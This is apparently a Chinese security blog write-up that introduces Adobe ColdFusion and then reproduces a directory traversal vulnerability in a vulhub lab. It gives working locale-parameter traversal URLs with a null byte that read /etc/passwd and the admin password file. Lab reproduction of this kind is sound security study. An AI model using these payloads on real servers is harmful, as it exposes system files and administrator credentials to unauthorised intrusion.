Adobe ColdFusion（直译：冷聚变），是一个动态Web服务器，其CFML（ColdFusion Markup
Language）是一种[程序设计语言](https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80)，类似JSP里的JSTL（JSP
Standard Tag Lib），从1995年开始开发，其设计思想被一些人认为非常先进，被一些语言所借鉴。

Coldfusion 最早是由 Allaire 公司开发的一种应用服务器平台，其运行的 CFML（ColdFusion Markup
Language）针对Web应用的一种[脚本语言](https://baike.baidu.com/item/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80)。文件以*.cfm为文件名，在ColdFusion专用的应用服务器环境下运行。在
Allaire 公司被 Macromedia 公司收购以后，推出了 Macromedia ColdFusion
5.0，类似于其他的应用程序语言，cfm文件被[编译器](https://baike.baidu.com/item/%E7%BC%96%E8%AF%91%E5%99%A8)翻译为对应的
c++
语言程序，然后运行并向[浏览器](https://baike.baidu.com/item/%E6%B5%8F%E8%A7%88%E5%99%A8)返回结果。
虽然 .cfc 和 custom tag 具有类似的重用性，但 cfc 提供了更加灵活的调用方式，例如 webservice 方式的调用支持。

本文仅作漏洞复现记录与实现，利用流程如下:

1.漏洞环境

链接:http://192.168.101.152:8500/

访问http://192.168.101.152:8500/CFIDE/administrator/enter.cfm后是这样的

![1615973263_6051cb8fca51a74633268.png!small](https://image.3001.net/images/20210317/1615973263_6051cb8fca51a74633268.png!small)

使用vulhub搭建漏洞环境的话需要初始化环境，初始密码为admin，输入后等待初始环境完成即可

2.漏洞利用

使用burp重放访问

<http://192.168.101.152:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en>

直接使用浏览器访问有时可能会因为url编码无法读取

![1615973364_6051cbf416c8c6ecd8cb9.png!small](https://image.3001.net/images/20210317/1615973364_6051cbf416c8c6ecd8cb9.png!small)

读取到了[/etc/passwd](http://192.168.101.152:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en)文件内容

访问

<http://192.168.101.152:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en>

读取后台管理员密码

![1615973467_6051cc5bb244e68671c7a.png!small](https://image.3001.net/images/20210317/1615973467_6051cc5bb244e68671c7a.png!small)

![1615973507_6051cc83eb15eff239f53.png!small](https://image.3001.net/images/20210317/1615973507_6051cc83eb15eff239f53.png!small)

有时候无法读取可以尝试删除cookie值

